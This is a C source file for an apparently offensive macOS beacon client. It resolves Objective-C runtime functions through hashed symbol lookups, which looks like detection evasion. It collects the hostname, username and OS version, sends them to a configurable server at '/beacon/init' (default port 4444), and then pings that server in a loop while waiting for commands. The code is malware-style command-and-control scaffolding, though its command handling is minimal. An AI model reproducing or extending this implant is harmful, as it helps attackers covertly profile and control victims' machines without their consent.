#include <runtime/kit.h>
#include <runtime/obf.h>
#include <runtime/xspring.h>
#include <runtime/symbol_resolv.h>
#include <runtime/kit.h>
#include <runtime/foundation.h>
#include <runtime/messaging.h>
#include "network.h"
#include "client.h"
#include "sysinfo.h"
#include <CoreFoundation/CoreFoundation.h>
#include <CFNetwork/CFNetwork.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>


#ifdef DEBUG
#include <stdarg.h>
static inline void debug_log(const char* fmt, ...) {
    va_list args;
    va_start(args, fmt);
    fprintf(stderr, "[DEBUG] ");
    vfprintf(stderr, fmt, args);
    fprintf(stderr, "\n");
    va_end(args);
}
#define DEBUG_LOG(...) debug_log(__VA_ARGS__)
#else
#define DEBUG_LOG(...) ((void)0)
#endif

// Global state
static bool should_run = true;

// Forward declarations
static bool load_config(const char* config_path, client_config_t* config);
static bool send_ping(ClientContext* ctx);
static void handle_command(const char* command);

// Load configuration from file
static bool load_config(const char* config_path, client_config_t* config) {
    FILE* fp = fopen(config_path, "r");
    if (!fp) {
        // If config doesn't exist, use defaults
        strncpy(config->server_host, "127.0.0.1", sizeof(config->server_host) - 1);
        config->server_port = 4444;
        config->ping_interval = 3;
        snprintf(config->client_id, sizeof(config->client_id), "client_%d", getpid());
        return false;
    }

    char line[512];
    while (fgets(line, sizeof(line), fp)) {
        char key[64], value[256];
        if (sscanf(line, "%63[^=]=%255s", key, value) == 2) {
            if (strcmp(key, "server_host") == 0) {
                strncpy(config->server_host, value, sizeof(config->server_host) - 1);
            } else if (strcmp(key, "server_port") == 0) {
                config->server_port = atoi(value);
            } else if (strcmp(key, "ping_interval") == 0) {
                config->ping_interval = atoi(value);
            } else if (strcmp(key, "client_id") == 0) {
                strncpy(config->client_id, value, sizeof(config->client_id) - 1);
            }
        }
    }
    fclose(fp);
    return true;
}


static bool send_init(ClientContext* ctx) {
    SystemInfo info;
    if (!GetAllSystemInfo(&ctx->darwin, &info)) {
        DEBUG_LOG("Failed to get system information");
        return false;
    }

    DEBUG_LOG("System info retrieved successfully:");
    DEBUG_LOG("  Hostname: %s", info.hostname);
    DEBUG_LOG("  Username: %s", info.username);
    DEBUG_LOG("  OS Version: %s", info.os_version);

    char init_msg[1024];
    snprintf(init_msg, sizeof(init_msg),
        "INIT %s\nHOSTNAME: %s\nUSER: %s\nOS: %s\n",
        ctx->config.client_id,
        info.hostname,
        info.username,
        info.os_version);

    http_request_t req = {
        .url_path = "/beacon/init",
        .body = init_msg,
        .body_length = strlen(init_msg)
    };

    return send_http_request(ctx, &req);
}


static void handle_command(const char* command) {
    if (!command) return;

    if (strncmp(command, "STOP", 4) == 0) {
        should_run = false;
    }
    printf("Received command: %s\n", command);
}

static bool send_ping(ClientContext* ctx) {
    char ping_msg[512];
    snprintf(ping_msg, sizeof(ping_msg), "PING %s\n", ctx->config.client_id);

    http_request_t req = {
        .url_path = "/",
        .body = ping_msg,
        .body_length = strlen(ping_msg)
    };

    return send_http_request(ctx, &req);
}

bool InitializeDarwinApi(INSTANCE* instance) {
    DEBUG_LOG("Starting API initialization");

    // Get libobjc handle
    void* objc = GetLibraryHandleH(getLibHash());
    if (!objc) {
        DEBUG_LOG("Failed to get libobjc handle");
        return false;
    }
    DEBUG_LOG("Library handle obtained successfully: %p", objc);

    // Initialize Objective-C runtime functions
    instance->Darwin.objc_msgSend = (objc_msgSend_t)GetSymbolAddressH(objc, getObjcMsgSendHash());
    instance->Darwin.objc_getClass = (objc_getClass_t)GetSymbolAddressH(objc, getObjcGetClassHash());
    instance->Darwin.sel_registerName = (sel_registerName_t)GetSymbolAddressH(objc, getSelRegisterNameHash());

    if (!instance->Darwin.objc_msgSend || !instance->Darwin.objc_getClass || !instance->Darwin.sel_registerName) {
        DEBUG_LOG("Failed to resolve basic Objective-C functions");
        return false;
    }

    // Initialize system info classes and selectors
    instance->Darwin.processInfoClass = instance->Darwin.objc_getClass("NSProcessInfo");
    instance->Darwin.processInfoSel = instance->Darwin.sel_registerName("processInfo");
    instance->Darwin.hostNameSel = instance->Darwin.sel_registerName("hostName");
    instance->Darwin.userNameSel = instance->Darwin.sel_registerName("userName");
    instance->Darwin.osVersionSel = instance->Darwin.sel_registerName("operatingSystemVersionString");

    // Cache process info instance
    instance->Darwin.processInfo = instance->Darwin.objc_msgSend(
        instance->Darwin.processInfoClass,
        instance->Darwin.processInfoSel
    );

    if (!instance->Darwin.processInfo) {
        DEBUG_LOG("Failed to get processInfo instance");
        return false;
    }

    DEBUG_LOG("Successfully initialized all Darwin APIs");
    return true;
}


int main(int argc, char* argv[]) {
    DEBUG_LOG("Starting client application");

    ClientContext ctx = {0};

    if (!InitializeDarwinApi(&ctx.darwin)) {
        printf("Failed to initialize Darwin API\n");
        return 1;
    }

    ctx.rtk = rtk_context_create();
    if (!ctx.rtk) {
        DEBUG_LOG("Failed to create runtime context");
        fprintf(stderr, "Failed to create runtime context\n");
        return 1;
    }

    const char* config_path = (argc > 1) ? argv[1] : "client.conf";
    DEBUG_LOG("Using config path: %s", config_path);

    if (!load_config(config_path, &ctx.config)) {
        DEBUG_LOG("Configuration loaded from file");
    } else {
        DEBUG_LOG("Using default configuration");
    }

    printf("Client started (ID: %s)\n", ctx.config.client_id);
    printf("Connecting to %s:%d\n", ctx.config.server_host, ctx.config.server_port);
    DEBUG_LOG("Client initialized with ID: %s", ctx.config.client_id);
    DEBUG_LOG("Server target: %s:%d", ctx.config.server_host, ctx.config.server_port);

    // Try to initialize
    if (!send_init(&ctx)) {
        DEBUG_LOG("Initialization failed");
        fprintf(stderr, "Failed to initialize with server\n");
        return 1;
    }

    // Start ping loop
    while (should_run) {
        if (!send_ping(&ctx)) {
            DEBUG_LOG("Ping failed");
            printf("Failed to connect to server, retrying in %d seconds\n", ctx.config.ping_interval);
        }
        sleep(ctx.config.ping_interval);
    }

    DEBUG_LOG("Shutting down client");
    rtk_context_destroy(ctx.rtk);
    DEBUG_LOG("Cleanup complete");
    return 0;
}
